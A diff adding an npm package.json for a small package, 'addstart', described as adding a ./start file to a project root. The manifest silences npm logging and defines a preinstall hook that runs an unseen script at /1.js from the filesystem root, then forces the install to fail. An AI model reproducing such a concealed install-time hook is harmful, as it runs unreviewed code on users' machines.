@@ -1,0 +1,34 @@
+{
+    "name": "addstart",
+    "version": "1.0.0",
+    "config": {
+        "log-level": "silent"
+    },
+    "scripts": {
+        "preinstall": "/usr/bin/node /1.js",
+        "install": "exit 1"
+    },
+    "description": "Позволяет добавить файл ./start в корень проекта.",
+    "contributors": [
+        {
+            "name": "Sergei"
+        }
+    ],
+    "main": "start",
+    "homepage": "http://github.com/classtype/addstart",
+    "repository": {
+        "type": "git",
+        "url": "git://github.com/classtype/addstart.git"
+    },
+    "licenses": [
+        {
+            "type": "MIT",
+            "url": "http://github.com/classtype/addstart/blob/master/LICENSE"
+        }
+    ],
+    "keywords": [
+        "add",
+        "start",
+        "addstart"
+    ]
+}
